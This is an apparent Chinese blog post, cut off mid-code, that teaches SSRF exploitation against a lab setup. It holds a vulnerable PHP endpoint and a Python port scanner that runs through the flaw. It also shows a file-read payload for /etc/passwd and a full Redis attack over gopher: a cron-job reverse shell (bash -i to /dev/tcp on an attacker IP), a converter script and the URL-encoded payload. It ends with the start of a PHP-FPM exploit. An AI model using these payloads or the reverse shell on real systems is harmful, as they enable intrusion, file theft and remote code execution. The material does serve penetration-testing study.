    <updated>2019-05-06T13:34:42.692Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>SSRF（Server-Side RequestForgery）服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。<br>关于ssrf的利用，一般有下面几种</p><ul><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li><li>利用 file 协议读取本地文件等</li><li>攻击运行在内网或本地的应用程序</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</li></ul><p>本文漏洞环境使用如下代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span></span><br><span class="line"><span class="php">    $ch = curl_init();</span></span><br><span class="line"><span class="php">    curl_setopt($ch, CURLOPT_URL, $url);</span></span><br><span class="line"><span class="php">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">    curl_exec($ch);</span></span><br><span class="line"><span class="php">    curl_close($ch);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$url = $_GET[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php">curl($url);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><h2 id="0x01-协议探测"><a href="#0x01-协议探测" class="headerlink" title="0x01 协议探测"></a>0x01 协议探测</h2><p>在对ssrf漏洞深入利用之前首先要做协议探测，在只有知道其支持哪些协议的情况下，才可以利用这些协议进行进一步的利用。<br>协议探测的方法比较简单，可以在vps上监听一个端口，然后用相关协议尝试连接即可。<br>常见协议及可利用方向如下</p><ul><li>dict （操作Redis）</li><li>file （任意文件读取）</li><li>ftp、ftps （FTP爆破）</li><li>tftp（UDP协议扩展）</li><li>gopher （操作Redis、Memcached、fastcgi、mysql等）</li><li>imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）</li><li>rtsp</li><li>smb/smbs （连接SMB）</li><li>telnet – 连接SSH/Telnet</li><li>http、https – 内网服务探测<ul><li>网络服务探测</li><li>ShellShock命令执行</li><li>JBOSS远程Invoker war命令执行</li><li>Java调试接口命令执行</li><li>axis2-admin部署Server命令执行</li><li>Jenkins Scripts接口命令执行</li><li>Confluence SSRF</li><li>Struts2一堆命令执行</li><li>counchdb WEB API远程命令执行</li><li>mongodb SSRF</li><li>docker API远程命令执行</li><li>php_fpm/fastcgi 命令执行</li><li>tomcat命令执行</li><li>Elasticsearch引擎Groovy脚本命令执行</li><li>WebDav PUT上传任意文件</li><li>WebSphere Admin可部署war间接命令执行</li><li>Apache Hadoop远程命令执行</li><li>zentoPMS远程命令执行</li><li>HFS远程命令执行</li><li>glassfish任意文件读取和war文件部署间接命令执行</li></ul></li></ul><p>其中<code>file</code> <code>dict</code> <code>gopher</code> <code>http/https</code>较为常用，下面进行相应的实例演示</p><h2 id="0x02-内网端口探测"><a href="#0x02-内网端口探测" class="headerlink" title="0x02 内网端口探测"></a>0x02 内网端口探测</h2><p>端口探测又利于快速定位内网开启了哪些服务，以便用于后续进一步的利用<br>利用<code>dict</code> <code>ftp</code> <code>gopher</code> <code>telnet</code>等协议在端口开放和关闭连接时间的长短及返回banner的不同可判断端口是否开放以及可能存在的服务。当然端口的探测存在一些其他的因素导致结果误报，如网络状况服务器性能等都有可能影响连接的时间。<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line">import Queue</span><br><span class="line">lock = threading.Lock()</span><br><span class="line">threads_count = <span class="number">10</span></span><br><span class="line">scheme = 'gopher'</span><br><span class="line">ports = [<span class="number">21,22,23,25</span>,<span class="number">69,80,81,82</span>,<span class="number">83,84,110</span>,<span class="number">389,389</span>,<span class="number">443,445</span>,<span class="number">488,512</span>,<span class="number">513,514</span>,<span class="number">873,901</span>,<span class="number">1043,1080</span>,<span class="number">1099,1090</span>,<span class="number">1158,1352</span>,<span class="number">1433,1434</span>,<span class="number">1521,2049</span>,<span class="number">2100,2181</span>,<span class="number">2601,2604</span>,<span class="number">3128,3306</span>,<span class="number">3307,3389</span>,<span class="number">4440,4444</span>,<span class="number">4445,4848</span>,<span class="number">5000,5280</span>,<span class="number">5432,5500</span>,<span class="number">5632,5900</span>,<span class="number">5901,5902</span>,<span class="number">5903,5984</span>,<span class="number">6000,6033</span>,<span class="number">6082,6379</span>,<span class="number">6666,7001</span>,<span class="number">7001,7002</span>,<span class="number">7070,7101</span>,<span class="number">7676,7777</span>,<span class="number">7899,7988</span>,<span class="number">8000,8001</span>,<span class="number">8002,8003</span>,<span class="number">8004,8005</span>,<span class="number">8006,8007</span>,<span class="number">8008,8009</span>,<span class="number">8069,8080</span>,<span class="number">8081,8082</span>,<span class="number">8083,8084</span>,<span class="number">8085,8086</span>,<span class="number">8087,8088</span>,<span class="number">8089,8090</span>,<span class="number">8091,8092</span>,<span class="number">8093,8094</span>,<span class="number">8095,8098</span>,<span class="number">8099,8980</span>,<span class="number">8990,8443</span>,<span class="number">8686,8787</span>,<span class="number">8880,8888</span>,<span class="number">9000,9001</span>,<span class="number">9043,9045</span>,<span class="number">9060,9080</span>,<span class="number">9081,9088</span>,<span class="number">9088,9090</span>,<span class="number">9091,9100</span>,<span class="number">9200,9300</span>,<span class="number">9443,9871</span>,<span class="number">9999,10000</span>,<span class="number">10068,10086</span>,<span class="number">11211,20000</span>,<span class="number">22022,22222</span>,<span class="number">27017,28017</span>,<span class="number">50060,50070</span>]</span><br><span class="line">ip_block = '<span class="number">192.168.111</span>'</span><br><span class="line"></span><br><span class="line">class WyWorker(threading.Thread):</span><br><span class="line">    def __init__(self,queue):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.queue = queue</span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            if self.queue.empty():</span><br><span class="line">                break</span><br><span class="line">            try:</span><br><span class="line">                url = self.queue.get()</span><br><span class="line">                time.sleep(<span class="number">0</span>.<span class="number">3</span>)</span><br><span class="line">                r = requests.get(url,timeout=<span class="number">5</span>)</span><br><span class="line">                </span><br><span class="line">            except:</span><br><span class="line">                lock.acquire()</span><br><span class="line">                ip_port = url.split(':')</span><br><span class="line">                ip = ip_port[-<span class="number">2</span>][<span class="number">2</span>:]</span><br><span class="line">                port = ip_port[-<span class="number">1</span>]</span><br><span class="line">                print "[+]&#123;ip&#125; : &#123;port&#125;  Open".format(ip=ip,port=port)</span><br><span class="line">                lock.release()</span><br><span class="line"># payload queue                </span><br><span class="line">queue = Queue.Queue()</span><br><span class="line">for c in xrange(<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">    ip = '&#123;<span class="number">0</span>&#125;.&#123;<span class="number">1</span>&#125;'.format(ip_block,c)</span><br><span class="line">    for port in ports:</span><br><span class="line"></span><br><span class="line">        payload = '&#123;scheme&#125;://&#123;ip&#125;:&#123;port&#125;'.format(</span><br><span class="line">            scheme=scheme,</span><br><span class="line">            ip=ip, </span><br><span class="line">            port=port</span><br><span class="line">            )</span><br><span class="line">        #print payload</span><br><span class="line">        url = "http://<span class="number">192.168.111.149</span>/ssrf.php?url=&#123;payload&#125;".format(payload=payload)</span><br><span class="line">        queue.put(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line">for i in xrange(threads_count):</span><br><span class="line">    threads.append(WyWorker(queue))</span><br><span class="line">for t in threads:</span><br><span class="line">    t.start()</span><br><span class="line">for t in threads:</span><br><span class="line">    t.join()</span><br><span class="line"></span><br><span class="line">while queue.qsize()&gt;<span class="number">0</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><h2 id="0x03-file协议任意文件读取"><a href="#0x03-file协议任意文件读取" class="headerlink" title="0x03 file协议任意文件读取"></a>0x03 file协议任意文件读取</h2><p>当存在ssrf并file协议可用时，可以实现任意文件读取<br><code>file:///etc/passwd</code><br><img src="https://i.loli.net/2019/05/06/5cd02bfa2a7f4.png" alt></p><h2 id="0x04-gopher协议攻击内网redis"><a href="#0x04-gopher协议攻击内网redis" class="headerlink" title="0x04 gopher协议攻击内网redis"></a>0x04 gopher协议攻击内网redis</h2><p>当存在一个ssrf漏洞并且支持gopher协议时，可以攻击内网中存在未授权访问漏洞的redis以扩大战果。<br>要想利用<code>gopher</code>协议攻击redis，首先需要将请求转换为gopher协议所能理解的方式。<br>这里我们利用bash脚本对redis发出的访问请求，利用socat进行端口转发获取请求内容<br>下面是反弹shell的bash脚本<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!shell</span></span><br><span class="line">echo -e <span class="string">"\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.111.145/2333 0&gt;&amp;1\n\n"</span>|redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="builtin-name">set</span> 1</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span><span class="built_in"> config </span><span class="builtin-name">set</span> dir /var/spool/cron/</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span><span class="built_in"> config </span><span class="builtin-name">set</span> dbfilename root</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> save</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> quit</span><br></pre></td></tr></table></figure></p><p>socat端口转发命令,该命令将请求的4444端口转发到6379端口，即我们请求4444端口相当于请求redis服务器的6379端口<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">socat</span> <span class="selector-tag">-v</span> <span class="selector-tag">tcp-listen</span><span class="selector-pseudo">:4444</span>,<span class="selector-tag">fork</span> <span class="selector-tag">tcp-connect</span><span class="selector-pseudo">:localhost</span><span class="selector-pseudo">:6379</span></span><br></pre></td></tr></table></figure></p><p>首先运行socat端口转发命令，等待端口转发。然后运行bash脚本<code>bash redis_exp.sh 127.0.0.1 4444</code>请求本地4444端口。<br>socat端会打印出redis交互过程<br><img src="https://i.loli.net/2019/05/04/5ccd8cfdb0544.png" alt><br>将内容复制到<code>redis.txt</code>，然后利用下面的python脚本将请求转化为gopher协议理解的内容</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">exp</span> = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">line</span> <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">line</span>[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'&gt;&lt;+'</span>:</span><br><span class="line">            continue</span><br><span class="line">        elif <span class="built_in">line</span>[<span class="number">-3</span>:<span class="number">-1</span>] == r<span class="string">'\r'</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">line</span>) == <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">exp</span> = <span class="built_in">exp</span> + <span class="string">'%0a%0d%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">line</span> = <span class="built_in">line</span>.<span class="built_in">replace</span>(r<span class="string">'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                <span class="built_in">line</span> = <span class="built_in">line</span>.<span class="built_in">replace</span>(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                <span class="built_in">exp</span> = <span class="built_in">exp</span> + <span class="built_in">line</span></span><br><span class="line">        elif <span class="built_in">line</span> == <span class="string">'\x0a'</span>:</span><br><span class="line">            <span class="built_in">exp</span> = <span class="built_in">exp</span> + <span class="string">'%0a'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">line</span> = <span class="built_in">line</span>.<span class="built_in">replace</span>(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            <span class="built_in">exp</span> = <span class="built_in">exp</span> + <span class="built_in">line</span></span><br><span class="line">print <span class="built_in">exp</span></span><br></pre></td></tr></table></figure><p>运行脚本进行转换<code>python redis_gopher.py redis.txt</code><br><img src="https://i.loli.net/2019/05/04/5ccd8dc075fa7.png" alt><br>转换的格式为<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a1%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">62</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a*/<span class="number">1</span> * * * * bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span><span class="number">.111</span><span class="number">.145</span>/<span class="number">2333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>adir%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">16</span>%<span class="number">0</span>d%<span class="number">0</span>a/var/spool/cron/%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">10</span>%<span class="number">0</span>d%<span class="number">0</span>adbfilename%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>aroot%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>asave%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>aquit%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>a</span><br></pre></td></tr></table></figure></p><p>此时可本地通过curl验证，返回五个<code>ok</code>,即我们前面的五条命令执行成功。<br><img src="https://i.loli.net/2019/05/04/5ccd8e0513c86.png" alt><br>此时回到一个存到ssrf的web页面<br>将上面的padload进行url编码<br><img src="https://i.loli.net/2019/05/04/5ccd8ea49ec3d.png" alt><br>然后添加到漏洞页面，进行访问即可<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://192.168.111.149/ssrf.php?url=gopher<span class="number">%3</span>A<span class="number">%2</span>F<span class="number">%2</span>F127.0.0.1<span class="number">%3</span>A6379<span class="number">%2</span>F_*3<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>aset<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%241</span><span class="number">%250</span>d<span class="number">%250</span>a1<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2462</span><span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%250</span>a*<span class="number">%2</span>F1<span class="number">%20</span>*<span class="number">%20</span>*<span class="number">%20</span>*<span class="number">%20</span>*<span class="number">%20</span>bash<span class="number">%20</span>-i<span class="number">%20</span><span class="number">%3</span>E<span class="number">%26</span><span class="number">%20</span><span class="number">%2</span>Fdev<span class="number">%2</span>Ftcp<span class="number">%2</span>F192.168.111.145<span class="number">%2</span>F2333<span class="number">%200</span><span class="number">%3</span>E<span class="number">%261</span><span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%250</span>d<span class="number">%250</span>a*4<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%246</span><span class="number">%250</span>d<span class="number">%250</span>aconfig<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>aset<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>adir<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2416</span><span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>Fvar<span class="number">%2</span>Fspool<span class="number">%2</span>Fcron<span class="number">%2</span>F<span class="number">%250</span>d<span class="number">%250</span>a*4<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%246</span><span class="number">%250</span>d<span class="number">%250</span>aconfig<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>aset<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2410</span><span class="number">%250</span>d<span class="number">%250</span>adbfilename<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%244</span><span class="number">%250</span>d<span class="number">%250</span>aroot<span class="number">%250</span>d<span class="number">%250</span>a*1<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%244</span><span class="number">%250</span>d<span class="number">%250</span>asave<span class="number">%250</span>d<span class="number">%250</span>a*1<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%244</span><span class="number">%250</span>d<span class="number">%250</span>aquit<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>a</span><br></pre></td></tr></table></figure></p><p>如果漏洞页面有回显，也可看到返回五个<code>ok</code><br><img src="https://i.loli.net/2019/05/04/5ccd8f30275f9.png" alt><br>此时在服务器监听端口即可收到反弹的shell<br><img src="https://i.loli.net/2019/05/04/5ccd8f7566cbf.png" alt></p><h2 id="0x05-gopher协议攻击内网PHP-FPM"><a href="#0x05-gopher协议攻击内网PHP-FPM" class="headerlink" title="0x05 gopher协议攻击内网PHP-FPM"></a>0x05 gopher协议攻击内网PHP-FPM</h2><p>PHP-FRM是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好后通过TCP传<br>送给FRM进行解析。当FRM可以未授权访问时，可以通过构造fastcgi协议包发送给FRM.以实现任意代码执行。漏洞具体成因可以查看p神的文章<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p>当PHP-FRM以tcp模式运行时，会监听本地一个端口（默认为9000）用于接收来自Nginx等服务器中间件发送的请求<br><img src="https://i.loli.net/2019/05/05/5ccecff9c445b.png" alt><br>我们构造该请求，并且可以转换为<code>gopher</code>协议支持的方式，当外网web页面存在ssrf漏洞并且支持gopher协议时，即可利用<code>gopher</code>协议利用内网PHP-FRM执行任意代码。<br>首先附上前人编写的exp<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import base64</span><br><span class="line">import random</span><br><span class="line">import argparse</span><br><span class="line">import sys</span><br><span class="line">from io import BytesIO</span><br><span class="line">import urllib</span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = True <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span><span class="params">(i)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="symbol">PY2:</span></span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="symbol">else:</span></span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span><span class="params">(c)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int)<span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="symbol">else:</span></span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span><span class="params">(s)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes)<span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="symbol">else:</span></span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span><span class="params">(s)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str)<span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> 